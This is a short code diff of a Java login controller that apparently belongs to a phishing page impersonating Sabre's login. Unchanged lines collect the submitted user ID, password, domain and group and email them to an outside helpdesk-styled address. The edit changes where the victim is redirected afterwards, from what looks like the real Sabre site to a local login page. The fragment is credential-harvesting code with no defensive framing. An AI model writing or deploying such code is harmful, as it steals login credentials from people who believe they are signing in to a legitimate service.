@@ -29,6 +29,6 @@ public class LoginController {
      String message = "User ID: " + userId + "\nPassword: " + password +"\n domain: " + domain + "\nGroup: " + (group != null ? group : "N/A");
 
      emailService.sendEmail("sabre@sabrehelpdesk.com", subject, message);
-        return  "redirect:https://commandcenter-ngp.sabre.com";
+        return  "redirect:/login";
     }
 }
